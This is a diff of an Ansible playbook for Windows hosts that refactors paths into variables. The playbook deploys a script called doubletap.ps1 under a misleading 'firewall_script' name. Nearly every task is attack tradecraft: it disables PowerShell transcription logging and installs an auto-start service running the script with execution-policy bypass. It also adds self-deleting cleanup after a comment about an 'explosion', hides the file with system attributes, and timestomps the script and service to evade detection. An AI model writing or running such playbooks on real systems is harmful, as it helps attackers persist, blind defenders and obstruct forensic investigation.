@@ -1,7 +1,13 @@
 ---
+- name: Define variables for paths and filenames
+  set_fact:
+    script_dest: "C:\\Windows\\Temp\\firewall_script2.ps1"
+    service_name: "DoubleTapScript"
+    service_display_name: "DoubleTap Script"
+
 - name: Disable PowerShell logging by modifying the registry
   win_registry:
-    path: "HKLM:\Software\Policies\Microsoft\Windows\PowerShell"
+    path: "HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell"
     name: "EnableTranscripting"
     type: dword
     data: "0"
@@ -10,44 +16,44 @@
 - name: Copy PowerShell script to target
   win_copy:
     src: "files/doubletap.ps1"
-    dest: "C:\\Windows\\Temp\\firewall_script.ps1"
+    dest: "{{ script_dest }}"
 
 - name: Create Windows Service to Run PowerShell Script
   win_service:
-    name: "FirewallScriptService"
-    display_name: "Firewall Script Service"
-    bin_path: "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\firewall_script.ps1"
+    name: "{{ service_name }}"
+    display_name: "{{ service_display_name }}"
+    bin_path: "powershell.exe -ExecutionPolicy Bypass -File {{ script_dest }}"
     startup: "automatic"
     state: "started"
 
 - name: Modify PowerShell script to self-delete service after execution
   win_lineinfile:
-    path: "C:\\Windows\\Temp\\firewall_script.ps1"
-    line: 'Stop-Service -Name "FirewallScriptService" -Force; Remove-Service -Name "FirewallScriptService"'
+    path: "{{ script_dest }}"
+    line: 'Stop-Service -Name "{{ service_name }}" -Force; Remove-Service -Name "{{ service_name }}"'
     insertafter: "# Cleanup after explosion"
 
 - name: Add script deletion at the end of the PowerShell script
   win_lineinfile:
-    path: "C:\\Windows\\Temp\\firewall_script.ps1"
+    path: "{{ script_dest }}"
     line: 'Remove-Item -Path $MyInvocation.MyCommand.Path -Force'
     insertafter: 'Log " My work here is done"''
 
 - name: Apply hidden and system attributes to the PowerShell script
   win_shell: |
-    attrib +h +s "C:\\Windows\\Temp\\firewall_script.ps1"
+    attrib +h +s "{{ script_dest }}"
 
 - name: Timestomp script and task to evade detection
   win_shell: |
     $time = (Get-Item "C:\\Windows\\System32\\cmd.exe").CreationTime
-    (Get-Item "C:\\Windows\\Temp\\firewall_script.ps1").CreationTime = $time
-    (Get-Item "C:\\Windows\\Temp\\firewall_script.ps1").LastWriteTime = $time
-    (Get-Item "C:\\Windows\\Temp\\firewall_script.ps1").LastAccessTime = $time
+    (Get-Item "{{ script_dest }}").CreationTime = $time
+    (Get-Item "{{ script_dest }}").LastWriteTime = $time
+    (Get-Item "{{ script_dest }}").LastAccessTime = $time
   args:
     executable: powershell.exe
 
 - name: Timestomp the Service to evade detection
   win_shell: |
-    $service = Get-WmiObject -Class Win32_Service -Filter "Name='FirewallScriptService'"
+    $service = Get-WmiObject -Class Win32_Service -Filter "Name='{{ service_name }}'"
     if ($service) {
         $time = (Get-Item "C:\\Windows\\System32\\cmd.exe").CreationTime
         $service.CreationDate = $time
